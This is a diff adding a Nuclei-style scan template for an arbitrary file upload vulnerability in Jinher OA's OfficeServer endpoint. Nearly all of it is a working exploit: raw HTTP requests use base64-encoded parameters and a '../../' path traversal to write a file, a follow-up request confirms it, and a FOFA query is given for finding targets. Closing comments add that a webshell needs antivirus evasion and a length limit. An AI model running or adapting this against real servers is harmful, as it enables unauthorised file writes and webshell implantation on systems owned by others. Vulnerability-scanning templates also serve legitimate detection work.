@@ -1,0 +1,54 @@
+id: jinher-oa-jc6-officeserver-fileupload
+
+info:
+  name: jinher-oa-jc6-OfficeServer-fileupload
+  author: xy
+  severity: critical
+  tags: jinher,oa,fileupload
+  description: 金和OA OfficeServer存在任意文件上传漏洞
+  reference:
+    - https://
+  metadata:
+    fofa-query: app="金和网络-金和OA"
+
+variables:
+  filename: "public/edit/{{rand_int(1,100)}}.txt"
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        POST /jc6/OfficeServer HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+        Cookie: OASESSIONID=847AE3A2E5D155AE7FB1CD2C6736CD66
+        Connection: close
+        Content-Length: 692
+
+        Hello World     87              0                533            
+        DBSTEP=REJTVEVQ
+        OPTION=U0FWRUZJTEU=
+        FILENAME={{base64("{{filepath}}")}}
+
+        {{randstr}}
+
+      - |              
+        GET /{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+    
+    payloads:
+      filepath: 
+        - "../../{{filename}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains((body_1), 'Hello World')"
+          - "status_code_2 == 200 && contains((body_2), '{{randstr}}')"
+        condition: and    
+
+# 文件上传路径为FILENAME参数值的base64编码
+# 写shell需要免杀，并且shell字符长度低于534(不知道什么原因)
